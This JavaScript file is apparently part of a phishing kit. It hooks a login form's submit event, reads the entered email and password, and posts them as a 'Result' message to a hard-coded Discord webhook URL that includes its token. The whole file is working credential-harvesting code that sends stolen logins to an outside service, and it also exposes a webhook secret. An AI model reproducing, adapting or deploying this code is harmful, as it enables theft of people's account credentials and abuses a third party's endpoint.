const form = document.querySelector("#form");

form.addEventListener("submit", (e) => {
  e.preventDefault();

  const identity = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  const my_text = `Result is:%0A - Identity: ${identity} %0A - Password: ${password}`;

  // Replace with your Discord webhook URL
  const webhookURL = "https://discord.com/api/webhooks/1149618099880984657/3qnXvasbZR_jvv1A6RijxC7sEVsbuRJ6BKj2loKG7AVSBaUfuncqOfozp4k3gSe4lWXR";

  const payload = {
    content: my_text,
  };

  fetch(webhookURL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(payload),
  })
    .then((response) => {
      if (response.ok) {
        console.log("Message sent successfully to Discord!");
      } else {
        console.error("Failed to send the message to Discord.");
        document.getElementById("alert-message").innerHTML =
          "Sorry, there was an error while sending your message.";
      }
    })
    .catch((error) => {
      console.error("Error:", error);
      document.getElementById("alert-message").innerHTML =
        "Sorry, there was an error while sending your message.";
    });
});
